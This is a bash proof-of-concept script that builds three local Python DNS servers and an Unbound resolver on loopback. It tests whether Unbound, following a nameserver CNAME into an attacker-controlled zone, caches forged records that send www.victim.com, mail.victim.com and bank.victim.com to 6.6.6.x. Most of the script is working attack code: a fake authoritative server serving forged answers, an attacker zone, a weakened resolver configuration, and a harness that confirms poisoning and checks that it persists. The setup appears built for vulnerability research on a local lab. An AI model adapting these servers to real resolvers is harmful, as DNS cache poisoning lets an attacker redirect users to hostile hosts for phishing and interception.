#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  NS→CNAME Cache Poisoning Proof-of-Concept
# ═══════════════════════════════════════════════════════════════════
#  证明：Unbound 将 NS→CNAME 解析链中攻击者区域返回的数据当作
#  可信 NS 地址缓存，随后向攻击者服务器发送查询，最终缓存并
#  返回伪造的解析结果。
#
#  架构：
#    127.0.0.2:53  — 合法权威服务器（root + com + victim.com）
#    127.0.0.3:53  — 攻击者权威服务器（evil.com）
#    127.0.0.1:53  — 伪造 NS（攻击者冒充 victim.com 的 NS）
#
#  攻击链：
#    1. victim.com NS = ns.victim.com（合法）
#    2. ns.victim.com CNAME → resolve.evil.com（RFC 2181 §10.3 违规）
#    3. resolve.evil.com A → 127.0.0.1（攻击者控制 evil.com 区域返回此记录）
#    4. Unbound 用 127.0.0.1 作为 victim.com 的 NS 地址
#    5. 攻击者的 Fake NS 返回 www.victim.com A=6.6.6.6（伪造）
#    6. Unbound 缓存 6.6.6.6 并返回给客户端 → 缓存投毒！
#
#  对照组：safe.com（NS 直接 A 记录，无 CNAME），攻击者无法介入
# ═══════════════════════════════════════════════════════════════════
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/unbound-cache-poison-test"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

kill_all() {
  pkill -f "python3.*dns_" 2>/dev/null || true
  pkill -f "unbound.*5353\|unbound-binary" 2>/dev/null || true
  sleep 1
}

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME Cache Poisoning Proof-of-Concept                 ║"
echo "║  证明 Unbound 将不可信数据缓存为可信 NS 地址               ║"
echo "╚══════════════════════════════════════════════════════════════╝"
kill_all

# ═══ Step 0: Add loopback IPs ═══
echo ""
echo "═══ Step 0: Setting up loopback IPs ═══"
ip addr add 127.0.0.2/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.3/8 dev lo 2>/dev/null || true
echo "  127.0.0.1 → Fake NS (attacker)"
echo "  127.0.0.2 → Legitimate auth (root/com/victim.com/safe.com)"
echo "  127.0.0.3 → Attacker auth (evil.com)"

# ═══ Step 1: Legitimate Auth Server (127.0.0.2:53) ═══
echo ""
echo "═══ Step 1: Starting legitimate auth server on 127.0.0.2:53 ═══"

cat > "$VDIR/legit_auth.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Legitimate authoritative DNS server on 127.0.0.2:53
Serves: root zone, com zone, victim.com zone, safe.com zone
"""
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-test/legit_queries.jsonl"

def enc(name):
    r = b''
    for l in name.rstrip('.').split('.'):
        r += bytes([len(l)]) + l.encode()
    return r + b'\x00'

def log_query(qname, qtype, source_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': source_ip}) + '\n')
    print(f"[LEGIT] {source_ip}: {qname} {qtype}", flush=True)

# Zone data: {(qname_lower, qtype): [(ttl, rdata_wire)]}
ZONES = {}

# ─── Root zone ───
Z = '.'
ZONES[(Z, 6)] = [(300, enc('ns1') + enc('admin') + struct.pack('!IIIII', 2026100901, 3600, 900, 604800, 86400))]
ZONES[(Z, 2)] = [(300, enc('ns1'))]
ZONES[('ns1', 1)] = [(300, struct.pack('!I', 0x7f000002))]  # ns1 A 127.0.0.2

# ─── com zone ───
Z = 'com'
ZONES[(Z, 6)] = [(300, enc(f'ns1.{Z}') + enc(f'admin.{Z}') + struct.pack('!IIIII', 2026100902, 3600, 900, 604800, 86400))]
# Delegation: victim.com NS ns.victim.com (NO glue — force CNAME resolution)
ZONES[('victim.com', 2)] = [(300, enc('ns.victim.com'))]
ZONES[('victim.com', 6)] = [(300, enc('ns.victim.com') + enc('admin.victim.com') + struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400))]
# Delegation: evil.com NS ns.evil.com, glue = ns.evil.com A 127.0.0.3
ZONES[('evil.com', 2)] = [(300, enc('ns.evil.com'))]
ZONES[('evil.com', 6)] = [(300, enc('ns.evil.com') + enc('admin.evil.com') + struct.pack('!IIIII', 2026100904, 3600, 900, 604800, 86400))]
ZONES[('ns.evil.com', 1)] = [(300, struct.pack('!I', 0x7f000003))]  # glue: A 127.0.0.3
# Delegation: safe.com NS ns.safe.com, glue = ns.safe.com A 127.0.0.2
ZONES[('safe.com', 2)] = [(300, enc('ns.safe.com'))]
ZONES[('safe.com', 6)] = [(300, enc('ns.safe.com') + enc('admin.safe.com') + struct.pack('!IIIII', 2026100905, 3600, 900, 604800, 86400))]
ZONES[('ns.safe.com', 1)] = [(300, struct.pack('!I', 0x7f000002))]  # glue: A 127.0.0.2

# ─── victim.com zone ───
Z = 'victim.com'
ZONES[(Z, 6)] = [(300, enc('ns.victim.com') + enc('admin.victim.com') + struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400))]
ZONES[(Z, 2)] = [(300, enc('ns.victim.com'))]
# CRITICAL: NS is a CNAME → RFC 2181 §10.3 violation
ZONES[('ns.victim.com', 5)] = [(300, enc('resolve.evil.com'))]  # CNAME → evil.com
# Legitimate records (only served by this auth, NOT by the fake NS)
ZONES[('www.victim.com', 1)] = [(300, struct.pack('!I', 0x01020304))]  # A 1.2.3.4
ZONES[('mail.victim.com', 1)] = [(300, struct.pack('!I', 0x01020305))]  # A 1.2.3.5

# ─── safe.com zone (control: NS has direct A, no CNAME) ───
Z = 'safe.com'
ZONES[(Z, 6)] = [(300, enc('ns.safe.com') + enc('admin.safe.com') + struct.pack('!IIIII', 2026100905, 3600, 900, 604800, 86400))]
ZONES[(Z, 2)] = [(300, enc('ns.safe.com'))]
ZONES[('ns.safe.com', 1)] = [(300, struct.pack('!I', 0x7f000002))]  # A 127.0.0.2
ZONES[('www.safe.com', 1)] = [(300, struct.pack('!I', 0x05050505))]  # A 5.5.5.5

def find_zone(qname):
    name = qname.lower().rstrip('.')
    # Check exact zone matches first (longest suffix)
    for suffix in ['victim.com', 'safe.com', 'evil.com', 'com', '.']:
        if name == suffix.rstrip('.') or name.endswith('.' + suffix.rstrip('.')):
            return suffix
    return None

def is_delegation_point(qname, qtype, zone):
    """Check if this query is for a delegation (referral) response."""
    qn = qname.lower().rstrip('.')
    if zone == 'com' and qtype != 6:  # SOA stays authoritative
        # Check if qname is a delegated subdomain
        for delegated in ['victim.com', 'evil.com', 'safe.com']:
            if qn == delegated or qn.endswith('.' + delegated):
                return True
    return False

def build_referral(txid, qname, qtype, qclass, zone_key):
    """Build a referral response (NOERROR, AA=0, authority+additional sections)."""
    qn = qname.lower().rstrip('.')
    # Find the closest enclosing delegated zone
    delegated = None
    for d in ['victim.com', 'evil.com', 'safe.com']:
        if qn == d or qn.endswith('.' + d):
            delegated = d
            break

    if delegated is None:
        # No delegation found, return SOA in authority
        flags = 0x8400  # QR=1, AA=1
        soa_key = (zone_key, 6)
        soa_data = ZONES[soa_key][0][1] if soa_key in ZONES else b''
        hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 1, 0)
        q = enc(qname) + struct.pack('!HH', qtype, qclass)
        auth = enc(zone_key) + struct.pack('!HH', 6, qclass) + struct.pack('!I', 300) + struct.pack('!H', len(soa_data)) + soa_data
        return hdr + q + auth

    # Build referral: AA=0, authority=NS, additional=glue
    flags = 0x8000  # QR=1, AA=0 (referral)
    ns_key = (delegated, 2)
    ns_data = ZONES[ns_key][0][1] if ns_key in ZONES else b''

    # Additional section: glue A records
    additional = b''
    add_count = 0
    ns_name_key = (delegated.replace('com', '') + '.' + delegated, 1)  # rough
    # Find glue for the NS name
    ns_name = 'ns.' + delegated
    glue_key = (ns_name, 1)
    if glue_key in ZONES:
        for ttl, rd in ZONES[glue_key]:
            additional += enc(ns_name) + struct.pack('!HH', 1, qclass) + struct.pack('!I', ttl) + struct.pack('!H', len(rd)) + rd
            add_count += 1

    hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 1, add_count)
    q = enc(qname) + struct.pack('!HH', qtype, qclass)
    auth = enc(delegated) + struct.pack('!HH', 2, qclass) + struct.pack('!I', 300) + struct.pack('!H', len(ns_data)) + ns_data

    return hdr + q + auth + additional

def build_response(txid, qname, qtype, qclass, zone_key, is_referral=False):
    if is_referral:
        return build_referral(txid, qname, qtype, qclass, zone_key)

    flags = 0x8400  # QR=1, AA=1
    answers = []

    key = (qname.lower().rstrip('.'), qtype)
    if key in ZONES:
        for ttl, rd in ZONES[key]:
            answers.append((qname, qtype, ttl, rd))

    # CNAME chase: if querying A/AAAA and there's a CNAME
    if qtype != 5:
        ck = (qname.lower().rstrip('.'), 5)
        if ck in ZONES:
            for ttl, rd in ZONES[ck]:
                answers.append((qname, 5, ttl, rd))

    hdr = struct.pack('!HHHHHH', txid, flags, 1, len(answers), 0, 0)
    q = enc(qname) + struct.pack('!HH', qtype, qclass)
    a = b''
    for n, t, ttl, rd in answers:
        a += enc(n) + struct.pack('!HH', t, qclass) + struct.pack('!I', ttl) + struct.pack('!H', len(rd)) + rd

    return hdr + q + a

QTM = {1:'A', 2:'NS', 5:'CNAME', 6:'SOA', 28:'AAAA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.2', 53))
print("[LEGIT] Listening on 127.0.0.2:53", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12
        labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off + 1 + ll > len(data): break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        qname = '.'.join(labels)
        qt, qc = struct.unpack('!HH', data[off+1:off+5])
        qtn = QTM.get(qt, f'T{qt}')

        log_query(qname, qtn, addr[0])

        # Determine zone
        qn = qname.lower().rstrip('.')
        zone = find_zone(qname)

        if zone is None:
            # Referral from root
            resp = build_referral(txid, qname, qt, qc, '.')
        elif is_delegation_point(qname, qt, zone):
            resp = build_referral(txid, qname, qt, qc, zone)
        else:
            resp = build_response(txid, qname, qt, qc, zone)

        sock.sendto(resp, addr)
    except Exception as e:
        print(f"[LEGIT] Error: {e}", flush=True)
PYEOF

# ═══ Step 2: Attacker Auth Server (127.0.0.3:53) ═══
echo ""
echo "═══ Step 2: Starting attacker auth server on 127.0.0.3:53 ═══"

cat > "$VDIR/evil_auth.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Attacker's authoritative DNS server on 127.0.0.3:53
Serves: evil.com zone
Key record: resolve.evil.com A → 127.0.0.1 (attacker's fake NS)
"""
import socket, struct, time, json

LOG = "/workspace/output/unbound-cache-poison-test/evil_queries.jsonl"

def enc(name):
    r = b''
    for l in name.rstrip('.').split('.'):
        r += bytes([len(l)]) + l.encode()
    return r + b'\x00'

def log_query(qname, qtype, source_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': source_ip}) + '\n')
    print(f"[EVIL]  {source_ip}: {qname} {qtype}", flush=True)

ZONES = {}
Z = 'evil.com'
ZONES[(Z, 6)] = [(300, enc('ns.evil.com') + enc('admin.evil.com') + struct.pack('!IIIII', 2026100904, 3600, 900, 604800, 86400))]
ZONES[(Z, 2)] = [(300, enc('ns.evil.com'))]
ZONES[('ns.evil.com', 1)] = [(300, struct.pack('!I', 0x7f000003))]  # A 127.0.0.3
# KEY: This record enables the attack — attacker controls what IP Unbound uses as victim.com's NS
ZONES[('resolve.evil.com', 1)] = [(300, struct.pack('!I', 0x7f000001))]  # A 127.0.0.1 → Fake NS!

def build_response(txid, qname, qtype, qclass):
    flags = 0x8400
    answers = []
    key = (qname.lower().rstrip('.'), qtype)
    if key in ZONES:
        for ttl, rd in ZONES[key]:
            answers.append((qname, qtype, ttl, rd))
    if qtype != 5:
        ck = (qname.lower().rstrip('.'), 5)
        if ck in ZONES:
            for ttl, rd in ZONES[ck]:
                answers.append((qname, 5, ttl, rd))
    hdr = struct.pack('!HHHHHH', txid, flags, 1, len(answers), 0, 0)
    q = enc(qname) + struct.pack('!HH', qtype, qclass)
    a = b''
    for n, t, ttl, rd in answers:
        a += enc(n) + struct.pack('!HH', t, qclass) + struct.pack('!I', ttl) + struct.pack('!H', len(rd)) + rd
    return hdr + q + a

QTM = {1:'A', 2:'NS', 5:'CNAME', 6:'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.3', 53))
print("[EVIL]  Listening on 127.0.0.3:53", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12
        labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off + 1 + ll > len(data): break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        qname = '.'.join(labels)
        qt, qc = struct.unpack('!HH', data[off+1:off+5])
        qtn = QTM.get(qt, f'T{qt}')
        log_query(qname, qtn, addr[0])
        resp = build_response(txid, qname, qt, qc)
        sock.sendto(resp, addr)
    except Exception as e:
        print(f"[EVIL]  Error: {e}", flush=True)
PYEOF

# ═══ Step 3: Fake NS (127.0.0.1:53) ═══
echo ""
echo "═══ Step 3: Starting fake NS on 127.0.0.1:53 ═══"

cat > "$VDIR/fake_ns.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Fake nameserver on 127.0.0.1:53
Pretends to be ns.victim.com (the CNAME-resolved address)
Returns FORGED records for victim.com
"""
import socket, struct, time, json

LOG = "/workspace/output/unbound-cache-poison-test/fake_ns_queries.jsonl"

def enc(name):
    r = b''
    for l in name.rstrip('.').split('.'):
        r += bytes([len(l)]) + l.encode()
    return r + b'\x00'

def log_query(qname, qtype, source_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': source_ip}) + '\n')
    print(f"[FAKE]  {source_ip}: {qname} {qtype}  ← ATTACKER RECEIVED QUERY!", flush=True)

ZONES = {}
Z = 'victim.com'
ZONES[(Z, 6)] = [(300, enc('ns.victim.com') + enc('admin.victim.com') + struct.pack('!IIIII', 999999, 3600, 900, 604800, 86400))]
ZONES[(Z, 2)] = [(300, enc('ns.victim.com'))]
ZONES[('ns.victim.com', 1)] = [(300, struct.pack('!I', 0x7f000001))]  # A 127.0.0.1
# FORGED RECORDS — these should NOT be served by this server
# because 127.0.0.1 is NOT the legitimate NS for victim.com
# But because Unbound followed the CNAME, it queries here!
ZONES[('www.victim.com', 1)] = [(300, struct.pack('!I', 0x06060606))]  # FORGED: A 6.6.6.6
ZONES[('mail.victim.com', 1)] = [(300, struct.pack('!I', 0x06060607))]  # FORGED: A 6.6.6.7
ZONES[('bank.victim.com', 1)] = [(300, struct.pack('!I', 0x06060608))]  # FORGED: A 6.6.6.8

def build_response(txid, qname, qtype, qclass):
    flags = 0x8400  # QR=1, AA=1
    answers = []
    key = (qname.lower().rstrip('.'), qtype)
    if key in ZONES:
        for ttl, rd in ZONES[key]:
            answers.append((qname, qtype, ttl, rd))
    if qtype != 5:
        ck = (qname.lower().rstrip('.'), 5)
        if ck in ZONES:
            for ttl, rd in ZONES[ck]:
                answers.append((qname, 5, ttl, rd))
    if not answers:
        # Return SOA in authority for NXDOMAIN or no data
        flags = 0x8403  # QR=1, AA=1, NXDOMAIN
        soa = ZONES.get(('victim.com', 6), [(300, b'')])[0][1]
        hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 1, 0)
        q = enc(qname) + struct.pack('!HH', qtype, qclass)
        auth = enc('victim.com') + struct.pack('!HH', 6, qclass) + struct.pack('!I', 300) + struct.pack('!H', len(soa)) + soa
        return hdr + q + auth
    hdr = struct.pack('!HHHHHH', txid, flags, 1, len(answers), 0, 0)
    q = enc(qname) + struct.pack('!HH', qtype, qclass)
    a = b''
    for n, t, ttl, rd in answers:
        a += enc(n) + struct.pack('!HH', t, qclass) + struct.pack('!I', ttl) + struct.pack('!H', len(rd)) + rd
    return hdr + q + a

QTM = {1:'A', 2:'NS', 5:'CNAME', 6:'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 53))
print("[FAKE]  Listening on 127.0.0.1:53 (forged NS for victim.com)", flush=True)
print("[FAKE]  Will return FORGED records:", flush=True)
print("[FAKE]    www.victim.com  A 6.6.6.6  (legitimate = 1.2.3.4)", flush=True)
print("[FAKE]    mail.victim.com A 6.6.6.7  (legitimate = 1.2.3.5)", flush=True)
print("[FAKE]    bank.victim.com A 6.6.6.8  (doesn't exist in legitimate)", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12
        labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off + 1 + ll > len(data): break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        qname = '.'.join(labels)
        qt, qc = struct.unpack('!HH', data[off+1:off+5])
        qtn = QTM.get(qt, f'T{qt}')
        log_query(qname, qtn, addr[0])
        resp = build_response(txid, qname, qt, qc)
        sock.sendto(resp, addr)
    except Exception as e:
        print(f"[FAKE]  Error: {e}", flush=True)
PYEOF

# Clear logs
> "$VDIR/legit_queries.jsonl"
> "$VDIR/evil_queries.jsonl"
> "$VDIR/fake_ns_queries.jsonl"

# Start servers
python3 "$VDIR/legit_auth.py" > "$VDIR/legit.log" 2>&1 &
LEGIT_PID=$!
sleep 0.5

python3 "$VDIR/evil_auth.py" > "$VDIR/evil.log" 2>&1 &
EVIL_PID=$!
sleep 0.5

python3 "$VDIR/fake_ns.py" > "$VDIR/fake.log" 2>&1 &
FAKE_PID=$!
sleep 0.5

# Verify all servers are running
echo "  Server PIDs: legit=$LEGIT_PID, evil=$EVIL_PID, fake=$FAKE_PID"
for pid in $LEGIT_PID $EVIL_PID $FAKE_PID; do
  if kill -0 "$pid" 2>/dev/null; then echo "  PID $pid: OK"; else echo "  PID $pid: FAILED"; fi
done

# Quick direct test
echo ""
echo "  Direct test (bypass Unbound):"
echo "    ns.victim.com CNAME:"
dig @127.0.0.2 -p 53 ns.victim.com CNAME +time=3 +noall +answer 2>&1 | head -3
echo "    resolve.evil.com A:"
dig @127.0.0.3 -p 53 resolve.evil.com A +time=3 +noall +answer 2>&1 | head -3
echo "    www.victim.com A (legitimate):"
dig @127.0.0.2 -p 53 www.victim.com A +time=3 +noall +answer 2>&1 | head -3
echo "    www.victim.com A (fake):"
dig @127.0.0.1 -p 53 www.victim.com A +time=3 +noall +answer 2>&1 | head -3

# ═══ Step 4: Unbound ═══
echo ""
echo "═══ Step 4: Starting Unbound ═══"

cat > "$VDIR/hint" << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF

cat > "$VDIR/ub.conf" << 'EOF'
server:
    directory: "/workspace/output/unbound-cache-poison-test"
    pidfile: "/workspace/output/unbound-cache-poison-test/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-cache-poison-test/unbound.log"
    verbosity: 3
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/unbound-cache-poison-test/hint"
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes

remote-control:
    control-enable: no
EOF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/unbound_stdout.log" 2>&1 &
UB_PID=$!
sleep 2

if kill -0 "$UB_PID" 2>/dev/null; then
  echo "  Unbound started (PID=$UB_PID, port=5353)"
else
  echo "  Unbound FAILED. Log:"
  cat "$VDIR/unbound.log" | head -30
  kill_all; exit 1
fi

# ═══ Step 5: THE ATTACK TEST ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ATTACK TEST: Does Unbound return forged data?              ║"
echo "╚══════════════════════════════════════════════════════════════╝"

python3 << 'PYEOF'
import socket, struct, time, json

def dns_query(name, qtype, port=5353, timeout=15):
    qname = b''
    for label in name.rstrip('.').split('.'):
        qname += bytes([len(label)]) + label.encode()
    qname += b'\x00'
    txid = 0xBEEF
    header = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)
    question = qname + struct.pack('!HH', qtype, 1)
    pkt = header + question
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    start = time.monotonic()
    try:
        sock.sendto(pkt, ('127.0.0.1', port))
        data, _ = sock.recvfrom(4096)
        ms = (time.monotonic() - start) * 1000
        if len(data) >= 12:
            _, rflags, _, ans_count = struct.unpack('!HHHH', data[:8])
            rcode = rflags & 0xF
            rc_map = {0:'NOERROR',1:'FORMERR',2:'SERVFAIL',3:'NXDOMAIN',4:'NOTIMP',5:'REFUSED'}
            return rc_map.get(rcode, f'RC{rcode}'), ms, ans_count, data
        return 'ERR', ms, 0, b''
    except socket.timeout:
        return 'TIMEOUT', (time.monotonic() - start) * 1000, 0, b''
    finally:
        sock.close()

def parse_answer_ips(data):
    """Extract A record IPs from answer section."""
    if len(data) < 12:
        return []
    _, _, qdcount, ancount = struct.unpack('!HHHH', data[4:12])
    # Skip question
    off = 12
    for _ in range(qdcount):
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0:
                off += 2
                break
            off += 1 + data[off]
        else:
            off += 1  # skip null
        off += 4  # qtype + qclass
    # Parse answers
    ips = []
    for _ in range(ancount):
        # Name (may be compressed)
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0:
                off += 2
                break
            off += 1 + data[off]
        else:
            off += 1
        if off + 10 > len(data):
            break
        rtype, rclass, ttl, rdlen = struct.unpack('!HHIH', data[off:off+10])
        off += 10
        if off + rdlen > len(data):
            break
        if rtype == 1 and rdlen == 4:  # A record
            ip = '.'.join(str(b) for b in data[off:off+4])
            ips.append(ip)
        off += rdlen
    return ips

QT_A, QT_NS, QT_CNAME, QT_SOA = 1, 2, 5, 6

print()
print("  ═══ CONTROL GROUP: safe.com (NS→A, no CNAME) ═══")
print()
rcode, ms, ans, data = dns_query("www.safe.com", QT_A, timeout=10)
ips = parse_answer_ips(data)
print(f"  www.safe.com A: {rcode} {ms:.1f}ms, IPs={ips}")
if ips == ['5.5.5.5']:
    print("  ✓ Correct — returned legitimate 5.5.5.5 (from 127.0.0.2)")
else:
    print(f"  ✗ UNEXPECTED — expected 5.5.5.5, got {ips}")

time.sleep(1)

print()
print("  ═══ EXPERIMENT: victim.com (NS→CNAME→evil.com→attacker IP) ═══")
print()
print("  Expected legitimate answer: www.victim.com A 1.2.3.4")
print("  Forged answer from attacker: www.victim.com A 6.6.6.6")
print()

rcode, ms, ans, data = dns_query("www.victim.com", QT_A, timeout=15)
ips = parse_answer_ips(data)
print(f"  www.victim.com A: {rcode} {ms:.1f}ms, IPs={ips}")

POISONED = False
if '6.6.6.6' in ips:
    print()
    print("  ╔══════════════════════════════════════════════════════════════╗")
    print("  ║  ⚠  CACHE POISONING CONFIRMED!                              ║")
    print("  ║  Unbound returned FORGED 6.6.6.6 instead of 1.2.3.4        ║")
    print("  ║  The attacker's fake NS (127.0.0.1) was queried and        ║")
    print("  ║  its response was cached as authoritative for victim.com     ║")
    print("  ╚══════════════════════════════════════════════════════════════╝")
    POISONED = True
elif '1.2.3.4' in ips:
    print()
    print("  ✓ No poisoning — returned legitimate 1.2.3.4")
elif rcode == 'SERVFAIL':
    print()
    print("  Unbound returned SERVFAIL (may have rejected NS→CNAME)")
else:
    print()
    print(f"  Unexpected result: {rcode}, IPs={ips}")

# Test more forged records
if POISONED:
    print()
    print("  ─── Testing additional forged records ───")
    for name in ['mail.victim.com', 'bank.victim.com']:
        rcode2, ms2, ans2, data2 = dns_query(name, QT_A, timeout=10)
        ips2 = parse_answer_ips(data2)
        print(f"  {name} A: {rcode2} {ms2:.1f}ms, IPs={ips2}")

    # Test that cached result persists
    print()
    print("  ─── Persistence test (repeat query) ───")
    time.sleep(1)
    rcode3, ms3, ans3, data3 = dns_query("www.victim.com", QT_A, timeout=10)
    ips3 = parse_answer_ips(data3)
    print(f"  www.victim.com A (cached): {rcode3} {ms3:.1f}ms, IPs={ips3}")
    if '6.6.6.6' in ips3:
        print("  ✓ Poisoned result persists in cache!")
    else:
        print("  Result changed — cache may have expired or been evicted")

# Save results
result = {
    'attack_success': POISONED,
    'www_victim_com': ips,
    'expected_legitimate': '1.2.3.4',
    'expected_forged': '6.6.6.6',
}
with open('/workspace/output/unbound-cache-poison-test/result.json', 'w') as f:
    json.dump(result, f, indent=2)

PYEOF

# ═══ Step 6: Analyze server logs ═══
echo ""
echo "═══ Step 6: Server log analysis ═══"

echo ""
echo "  ─── Legitimate auth (127.0.0.2) queries ───"
cat "$VDIR/legit_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    if line.strip():
        q = json.loads(line)
        print(f\"    {q['qname']:<30} {q['qtype']:<8} from={q['from']}\")" 2>/dev/null || echo "  (no queries)"

echo ""
echo "  ─── Attacker auth (127.0.0.3) queries ───"
cat "$VDIR/evil_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    if line.strip():
        q = json.loads(line)
        print(f\"    {q['qname']:<30} {q['qtype']:<8} from={q['from']}\")" 2>/dev/null || echo "  (no queries)"

echo ""
echo "  ─── Fake NS (127.0.0.1) queries ───"
FAKE_COUNT=$(wc -l < "$VDIR/fake_ns_queries.jsonl" 2>/dev/null || echo "0")
echo "  Total queries to fake NS: $FAKE_COUNT"
if [ "$FAKE_COUNT" -gt 0 ]; then
  cat "$VDIR/fake_ns_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    if line.strip():
        q = json.loads(line)
        print(f\"    {q['qname']:<30} {q['qtype']:<8} from={q['from']}  ← UNAUTHORIZED!\")" 2>/dev/null
  echo ""
  echo "  ⚠ Unbound sent queries to the FAKE NS (127.0.0.1)!"
  echo "  This proves that the CNAME-resolved address was used as victim.com's NS."
fi

# ═══ Step 7: Unbound log ═══
echo ""
echo "═══ Step 7: Unbound log ═══"

echo ""
echo "  --- victim.com resolution entries ---"
grep -i "victim" "$VDIR/unbound.log" 2>/dev/null | head -30 || echo "  (none)"

echo ""
echo "  --- CNAME / resolve.evil.com entries ---"
grep -i "cname\|resolve.evil\|evil.com" "$VDIR/unbound.log" 2>/dev/null | head -20 || echo "  (none)"

echo ""
echo "  --- target / NS address resolution ---"
grep -i "target\|ns\.victim\|resolving\|query restarts" "$VDIR/unbound.log" 2>/dev/null | head -20 || echo "  (none)"

# ═══ Step 8: Control group verification ═══
echo ""
echo "═══ Step 8: Control group verification ═══"

FAKE_SAFE=$(grep -c "safe\.com" "$VDIR/fake_ns_queries.jsonl" 2>/dev/null || echo "0")
echo "  Fake NS queries for safe.com: $FAKE_SAFE"
if [ "$FAKE_SAFE" -eq 0 ]; then
  echo "  ✓ No queries for safe.com reached the fake NS — CNAME is the specific enabler"
else
  echo "  ✗ safe.com queries unexpectedly reached the fake NS"
fi

# ═══ Step 9: Result ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Final Result                                               ║"
echo "╚══════════════════════════════════════════════════════════════╝"

if [ -f "$VDIR/result.json" ]; then
  python3 -c "
import json
r = json.load(open('$VDIR/result.json'))
print()
if r['attack_success']:
    print('  ⚠⚠⚠  CACHE POISONING ATTACK SUCCEEDED  ⚠⚠⚠')
    print()
    print('  1. victim.com NS = ns.victim.com (CNAME → resolve.evil.com)')
    print('  2. resolve.evil.com A = 127.0.0.1 (from attacker-controlled evil.com zone)')
    print('  3. Unbound treated 127.0.0.1 as the authoritative NS for victim.com')
    print('  4. Attacker\\'s fake NS returned www.victim.com A = 6.6.6.6 (forged)')
    print('  5. Unbound CACHED and RETURNED the forged 6.6.6.6 to clients')
    print()
    print('  Root cause: Unbound followed NS→CNAME across zone boundaries,')
    print('  allowing the attacker\\'s zone to control which IP is used as')
    print('  victim.com\\'s nameserver. This violates RFC 2181 §10.3.')
    print()
    print(f'  Forged result:   www.victim.com A {r[\"expected_forged\"]}')
    print(f'  Legitimate:      www.victim.com A {r[\"expected_legitimate\"]}')
    print(f'  Actually returned: {r[\"www_victim_com\"]}')
else:
    print('  Attack did not succeed in this configuration.')
    print(f'  Result: {r[\"www_victim_com\"]}')
    print('  This may mean Unbound rejected the NS→CNAME or used a different path.')
" 2>/dev/null
fi

echo ""
echo "  Logs saved to: $VDIR/"
echo "  - legit_queries.jsonl  (queries to legitimate auth 127.0.0.2)"
echo "  - evil_queries.jsonl   (queries to attacker auth 127.0.0.3)"
echo "  - fake_ns_queries.jsonl (queries to fake NS 127.0.0.1)"
echo "  - unbound.log          (Unbound detailed log)"

# Cleanup
kill_all
kill "$LEGIT_PID" "$EVIL_PID" "$FAKE_PID" 2>/dev/null || true

echo ""
echo "=== Test Complete ==="
